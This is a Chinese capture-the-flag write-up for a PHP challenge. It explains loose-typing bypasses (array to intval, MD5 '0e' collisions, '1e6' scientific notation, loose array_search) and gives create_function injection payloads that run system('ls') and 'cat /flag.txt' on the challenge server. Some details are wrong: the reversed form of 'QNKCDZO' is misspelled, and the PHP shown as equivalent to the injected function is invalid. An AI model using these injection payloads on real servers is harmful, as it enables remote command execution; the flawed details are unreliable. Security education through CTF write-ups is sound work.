## 基本信息

* 题目名称： [NSSRound_16 Basic]了解过PHP特性吗
* 题目链接： https://www.nssctf.cn/problem/5059
* 考点清单： PHP弱类型、类型转换、哈希碰撞、代码注入
* 工具清单： PHP环境

## 解题思路
题目给出如下代码
```php
<?php
error_reporting(0);
highlight_file(__FILE__);
include("rce.php");
$checker_1 = FALSE;
$checker_2 = FALSE;
$checker_3 = FALSE;
$checker_4 = FALSE;
$num = $_GET['num'];
if (preg_match("/[0-9]/", $num)) {
    die("no!!");
}
if (intval($num)) {
    $checker_1 = TRUE;
}
if (isset($_POST['ctype']) && isset($_POST['is_num'])) {
    $ctype = strrev($_POST['ctype']);
    $is_num = strrev($_POST['is_num']);
    if (ctype_alpha($ctype) && is_numeric($is_num) && md5($ctype) == md5($is_num)) {
        $checker_2 = TRUE;
    }
}
$_114 = $_GET['114'];
$_514 = $_POST['514'];
if (isset($_114) && intval($_114) > 114514 && strlen($_114) <= 3) {
    if (!is_numeric($_514) && $_514 > 9999999) {
        $checker_3 = TRUE;
    }
}
$arr4y = $_POST['arr4y'];
if (is_array($arr4y)) {
    for ($i = 0; $i < count($arr4y); $i++) {
        if ($arr4y[$i] === "NSS") {
            die("no!");
        }
        $arr4y[$i] = intval($arr4y[$i]);
    }
    if (array_search("NSS", $arr4y) === 0) {
        $checker_4 = TRUE;
    }
}
if ($checker_1 && $checker_2 && $checker_3 && $checker_4) {
    echo $rce;
}
```
很明显这是一个考察PHP特性的题目，四个检查点分别利用了PHP的类型转换、哈希碰撞、科学计数法和数组搜索的特性来绕过。下面逐一分析每个检查点的绕过方法。

## 解题过程
共4个检查点，分别分析如下：
1. `if (preg_match("/[0-9]/", $num)) { die("no!!"); }`
   这里检查`$num`中是否包含数字字符，如果包含则终止程序。  
   但是`intval($num)`会将字符串转换为整数，如果字符串开头没有数字，则转换结果为0。  
   因此我们可以传入一个数组，例如`[1]`，这样可以绕过第一个检查点。
2. `if (isset($_POST['ctype']) && isset($_POST['is_num'])) { ... }`
   这里检查`ctype_alpha($ctype)`和`is_numeric($is_num)`，并且要求`md5($ctype) == md5($is_num)`。  
   php中，`ctype_alpha`检查字符串是否只包含字母，而`is_numeric`检查字符串是否为数字。处理 hash 字符串时，PHP 会将每一个以 0E 开头的哈希值解释为 0（0的xxx次方），那么只要传入的不同字符串经过哈希以后是以 0E 开头的，那么 PHP 会认为它们相同。因此我们可以利用这一点来绕过这个检查点。
    例如，`"QNKCDZO"`的MD5值是`0e830400451993494058024219903391`，而`"240610708"`的MD5值是`0e462097431906509019562988736854`。
    需要注意两个参数会被`strrev`反转，因此我们需要传入反转后的值，即`ctype`传入`OZDCDKNQ`，`is_num`传入`807016042`。
    <p align="center">
    <img src='images/%5BNSSRound_16 Basic%5D了解过PHP特性吗-md5_collision_bypass.png'>
    </p>

3. `if (isset($_114) && intval($_114) > 114514 && strlen($_114) <= 3) { ... }`
   这里检查`$_114`的整数值是否大于 114514，并且长度不超过 3。  
   由于长度限制，我们无法直接传入一个大于 114514 的数字字符串。  
   但是我们可以利用PHP的类型转换特性，传入一个字符串如`"1e6"`，其整数值会被转换为`1000000`，从而绕过这个检查点。
   对于`$_514`，我们可以利用`is_numeric`函数的漏洞，传入一个大数字如`"99999999"`，并且在其最后加上字母或空字符`%00`以绕过。
   <p align="center">
   <img src="images/%5BNSSRound_16 Basic%5D了解过PHP特性吗-scientific_notation_bypass.png">
   </p>

4. `if (is_array($arr4y)) { ... }`
   这里检查`$arr4y`是否为数组，并且要求数组中元素不强等于`"NSS"`，同时将数组元素转换为整数，最后检查`array_search("NSS", $arr4y) === 0`。  
   注意到`array_search`第三个参数默认为`false`，表示使用宽松比较，因此我们可以传入一个数组如`[0]`，这样`array_search("NSS", $arr4y)`会返回`0`，从而绕过这个检查点。
   <p align="center">
   <img src="images/%5BNSSRound_16 Basic%5D了解过PHP特性吗-array_search_bypass.png">
   </p>

传参获得如下提示
<p align="center">
<img src="images/%5BNSSRound_16 Basic%5D了解过PHP特性吗-rce_code_reveal.png">
</p>

`Rc3_function.php`内容如下
```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$nss=$_POST['nss'];
$shell = $_POST['shell'];
if(isset($shell)&& isset($nss)){
    $nss_shell = create_function($shell,$nss);
}
```
`create_function`函数用于动态创建一个匿名函数，第一个参数是函数的参数列表，第二个参数是函数体。相当于创建如下函数
```php
function lambda_1($shell) {
    return $nss;
}
```
所以可以传入如下payload
```
shell=$a&nss=echo($a);}system('ls');//
```
相当于如下代码
```php
function lambda_1($a) {
    return echo($a);
}system('ls');//
```
执行后如下
<p align="center">
<img src="images/%5BNSSRound_16 Basic%5D了解过PHP特性吗-rce_ls_output.png">
</p>
可以看到成功执行了代码
接下来尝试读取flag
```
shell=$a&nss=echo($a);}system('cat /flag.txt');//
```
<p align="center">
<img src="images/%5BNSSRound_16 Basic%5D了解过PHP特性吗-flag_cat_output.png">
</p>

## 总结

1.  **PHP弱类型与类型转换的应用**：在遇到数字检查函数（如 `preg_match`）时，尝试传入数组引发错误或绕过；面对数值大小与字符串长度限制的矛盾时，利用科学计数法（如 `1e6`）是一种常见的解题技巧。
2.  **哈希与比较函数的坑点**：时刻警惕 PHP 中 `==` 弱比较带来的问题（如 MD5 的 `0e` 碰撞），以及部分函数（如 `array_search`）默认采用的非严格模式，利用这些特性往往能绕过关键逻辑判断。
3.  **代码执行与注入思路**：遇到 `create_function` 这类基于字符串拼接创建函数的结构，应想到通过闭合花括号 `}` 来截断原定义并注入恶意代码（RCE），这与 SQL 注入闭合引号的思路异曲同工。

